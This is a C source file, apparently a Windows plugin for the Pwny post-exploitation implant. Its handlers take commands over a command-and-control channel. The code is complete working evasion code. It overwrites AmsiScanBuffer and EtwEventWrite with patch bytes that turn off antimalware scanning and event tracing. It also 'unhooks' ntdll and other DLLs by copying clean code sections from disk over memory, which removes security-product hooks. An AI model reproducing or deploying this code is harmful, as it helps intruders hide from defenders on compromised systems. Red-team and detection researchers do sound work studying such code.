/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Evasion COT plugin — AMSI/ETW patching + DLL unhooking.
 * Merged from evasion + unhook.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Tags                                                                */
/* ------------------------------------------------------------------ */

#define EVASION_PATCH_AMSI \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL)

#define EVASION_PATCH_ETW \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 1)

#define EVASION_PATCH_ALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

#define EVASION_UNHOOK_NTDLL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 3)

#define EVASION_UNHOOK_DLL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, TAB_BASE, API_CALL + 4)

/* TLV types — unhook */
#define TLV_TYPE_UNHOOK_DLL   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_UNHOOK_BYTES TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fn_FlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *fn_GetCurrentProcess)(void);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef HANDLE  (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                                          LPSECURITY_ATTRIBUTES,
                                          DWORD, DWORD, HANDLE);
typedef HANDLE  (WINAPI *fn_CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES,
                                                 DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID  (WINAPI *fn_MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fn_UnmapViewOfFile)(LPCVOID);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef UINT    (WINAPI *fn_GetSystemDirectoryA)(LPSTR, UINT);

static struct
{
    /* shared / evasion */
    fn_GetModuleHandleA      pGetModuleHandleA;
    fn_GetProcAddress        pGetProcAddress;
    fn_VirtualProtect        pVirtualProtect;
    fn_FlushInstructionCache pFlushInstructionCache;
    fn_GetCurrentProcess     pGetCurrentProcess;
    fn_LoadLibraryA          pLoadLibraryA;
    /* unhook-specific */
    fn_CreateFileA           pCreateFileA;
    fn_CreateFileMappingA    pCreateFileMappingA;
    fn_MapViewOfFile         pMapViewOfFile;
    fn_UnmapViewOfFile       pUnmapViewOfFile;
    fn_CloseHandle           pCloseHandle;
    fn_GetSystemDirectoryA   pGetSystemDirectoryA;
} w;

/* ------------------------------------------------------------------ */
/* Inline memcpy                                                       */
/* ------------------------------------------------------------------ */

static __inline void cot_memcpy(void *dst, const void *src, size_t n)
{
    volatile unsigned char *d = (volatile unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;

    while (n--)
        *d++ = *s++;
}

/* ================================================================== */
/* AMSI / ETW patching                                                 */
/* ================================================================== */

#ifdef _WIN64
#define AMSI_PATCH_SIZE  6
static unsigned char amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

#define ETW_PATCH_SIZE   4
static unsigned char etw_patch[]  = { 0x48, 0x33, 0xC0, 0xC3 };
#else
#define AMSI_PATCH_SIZE  8
static unsigned char amsi_patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

#define ETW_PATCH_SIZE   6
static unsigned char etw_patch[]  = { 0x33, 0xC0, 0xC2, 0x14, 0x00, 0x90 };
#endif

static int evasion_patch_function(const char *module, const char *func,
                                  unsigned char *patch, size_t patch_size)
{
    HMODULE hMod;
    FARPROC pFunc;
    DWORD dwOldProt;

    hMod = w.pGetModuleHandleA(module);
    if (hMod == NULL)
    {
        log_debug("* evasion: module %s not loaded\n", module);
        return -1;
    }

    pFunc = w.pGetProcAddress(hMod, func);
    if (pFunc == NULL)
    {
        log_debug("* evasion: function %s not found\n", func);
        return -1;
    }

    if (!w.pVirtualProtect((LPVOID)pFunc, patch_size,
                           PAGE_EXECUTE_READWRITE, &dwOldProt))
    {
        log_debug("* evasion: VirtualProtect failed\n");
        return -1;
    }

    cot_memcpy((void *)pFunc, patch, patch_size);

    w.pVirtualProtect((LPVOID)pFunc, patch_size, dwOldProt, &dwOldProt);
    w.pFlushInstructionCache(w.pGetCurrentProcess(),
                             (LPCVOID)pFunc, patch_size);

    log_debug("* evasion: patched %s\n", func);
    return 0;
}

static tlv_pkt_t *evasion_amsi(c2_t *c2)
{
    if (evasion_patch_function("amsi.dll", "AmsiScanBuffer",
                               amsi_patch, AMSI_PATCH_SIZE) != 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *evasion_etw(c2_t *c2)
{
    if (evasion_patch_function("ntdll.dll", "EtwEventWrite",
                               etw_patch, ETW_PATCH_SIZE) != 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *evasion_all(c2_t *c2)
{
    int amsi_ok;
    int etw_ok;

    w.pLoadLibraryA("amsi.dll");

    amsi_ok = evasion_patch_function("amsi.dll", "AmsiScanBuffer",
                                     amsi_patch, AMSI_PATCH_SIZE);
    etw_ok = evasion_patch_function("ntdll.dll", "EtwEventWrite",
                                    etw_patch, ETW_PATCH_SIZE);

    if (amsi_ok != 0 && etw_ok != 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ================================================================== */
/* DLL unhooking — restore .text from disk                             */
/* ================================================================== */

typedef struct
{
    DWORD VirtualAddress;
    DWORD VirtualSize;
    DWORD RawOffset;
    DWORD RawSize;
} text_section_t;

static int find_text_section(unsigned char *base, text_section_t *out)
{
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *sec;
    int i;

    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return -1;

    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return -1;

    sec = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (sec[i].Name[0] == '.' &&
            sec[i].Name[1] == 't' &&
            sec[i].Name[2] == 'e' &&
            sec[i].Name[3] == 'x' &&
            sec[i].Name[4] == 't')
        {
            out->VirtualAddress = sec[i].VirtualAddress;
            out->VirtualSize    = sec[i].Misc.VirtualSize;
            out->RawOffset      = sec[i].PointerToRawData;
            out->RawSize        = sec[i].SizeOfRawData;
            return 0;
        }
    }

    return -1;
}

static int do_unhook(const char *dll_name, int *bytes_replaced)
{
    HMODULE hModule;
    char sys_dir[MAX_PATH];
    char dll_path[MAX_PATH];
    HANDLE hFile;
    HANDLE hMapping;
    unsigned char *pMapping;
    text_section_t mem_text;
    text_section_t file_text;
    unsigned char *mem_base;
    DWORD old_protect;
    int len;
    int i;

    *bytes_replaced = 0;

    hModule = w.pGetModuleHandleA(dll_name);
    if (hModule == NULL)
        return -1;

    mem_base = (unsigned char *)hModule;

    if (find_text_section(mem_base, &mem_text) != 0)
        return -2;

    len = (int)w.pGetSystemDirectoryA(sys_dir, sizeof(sys_dir));
    if (len <= 0)
        return -3;

    i = 0;
    while (i < MAX_PATH - 1 && sys_dir[i]) i++;
    if (i < MAX_PATH - 1) dll_path[i] = '\0';
    cot_memcpy(dll_path, sys_dir, i);
    dll_path[i++] = '\\';
    {
        const char *p = dll_name;
        while (*p && i < MAX_PATH - 1)
            dll_path[i++] = *p++;
    }
    dll_path[i] = '\0';

    hFile = w.pCreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return -4;

    hMapping = w.pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMapping == NULL)
    {
        w.pCloseHandle(hFile);
        return -5;
    }

    pMapping = (unsigned char *)w.pMapViewOfFile(hMapping, FILE_MAP_READ,
                                                  0, 0, 0);
    if (pMapping == NULL)
    {
        w.pCloseHandle(hMapping);
        w.pCloseHandle(hFile);
        return -6;
    }

    if (find_text_section(pMapping, &file_text) != 0)
    {
        w.pUnmapViewOfFile(pMapping);
        w.pCloseHandle(hMapping);
        w.pCloseHandle(hFile);
        return -7;
    }

    if (!w.pVirtualProtect(mem_base + mem_text.VirtualAddress,
                            mem_text.VirtualSize,
                            PAGE_EXECUTE_READWRITE, &old_protect))
    {
        w.pUnmapViewOfFile(pMapping);
        w.pCloseHandle(hMapping);
        w.pCloseHandle(hFile);
        return -8;
    }

    {
        DWORD copy_size = mem_text.VirtualSize;
        if (file_text.RawSize < copy_size)
            copy_size = file_text.RawSize;

        cot_memcpy(mem_base + mem_text.VirtualAddress,
                   pMapping + file_text.RawOffset,
                   copy_size);

        *bytes_replaced = (int)copy_size;
    }

    w.pVirtualProtect(mem_base + mem_text.VirtualAddress,
                       mem_text.VirtualSize,
                       old_protect, &old_protect);

    w.pUnmapViewOfFile(pMapping);
    w.pCloseHandle(hMapping);
    w.pCloseHandle(hFile);

    return 0;
}

static tlv_pkt_t *unhook_ntdll(c2_t *c2)
{
    int bytes = 0;
    int ret;
    tlv_pkt_t *result;

    ret = do_unhook("ntdll.dll", &bytes);
    if (ret != 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_UNHOOK_BYTES, bytes);
    return result;
}

static tlv_pkt_t *unhook_dll(c2_t *c2)
{
    char dll_name[256];
    int bytes = 0;
    int ret;
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_UNHOOK_DLL, dll_name) < 0)
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);

    ret = do_unhook(dll_name, &bytes);
    if (ret != 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_UNHOOK_BYTES, bytes);
    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Shared / evasion APIs */
    w.pGetModuleHandleA      = (fn_GetModuleHandleA)cot_resolve("kernel32.dll",
                                                                  "GetModuleHandleA");
    w.pGetProcAddress        = (fn_GetProcAddress)cot_resolve("kernel32.dll",
                                                                "GetProcAddress");
    w.pVirtualProtect        = (fn_VirtualProtect)cot_resolve("kernel32.dll",
                                                                "VirtualProtect");
    w.pFlushInstructionCache = (fn_FlushInstructionCache)cot_resolve("kernel32.dll",
                                                                      "FlushInstructionCache");
    w.pGetCurrentProcess     = (fn_GetCurrentProcess)cot_resolve("kernel32.dll",
                                                                   "GetCurrentProcess");
    w.pLoadLibraryA          = (fn_LoadLibraryA)cot_resolve("kernel32.dll",
                                                              "LoadLibraryA");

    /* Unhook-specific APIs */
    w.pCreateFileA           = (fn_CreateFileA)cot_resolve("kernel32.dll",
                                                            "CreateFileA");
    w.pCreateFileMappingA    = (fn_CreateFileMappingA)cot_resolve("kernel32.dll",
                                                                    "CreateFileMappingA");
    w.pMapViewOfFile         = (fn_MapViewOfFile)cot_resolve("kernel32.dll",
                                                              "MapViewOfFile");
    w.pUnmapViewOfFile       = (fn_UnmapViewOfFile)cot_resolve("kernel32.dll",
                                                                "UnmapViewOfFile");
    w.pCloseHandle           = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                            "CloseHandle");
    w.pGetSystemDirectoryA   = (fn_GetSystemDirectoryA)cot_resolve("kernel32.dll",
                                                                     "GetSystemDirectoryA");

    /* Evasion handlers */
    api_call_register(api_calls, EVASION_PATCH_AMSI,   (api_t)evasion_amsi);
    api_call_register(api_calls, EVASION_PATCH_ETW,    (api_t)evasion_etw);
    api_call_register(api_calls, EVASION_PATCH_ALL,    (api_t)evasion_all);

    /* Unhook handlers */
    api_call_register(api_calls, EVASION_UNHOOK_NTDLL, (api_t)unhook_ntdll);
    api_call_register(api_calls, EVASION_UNHOOK_DLL,   (api_t)unhook_dll);
}

#endif
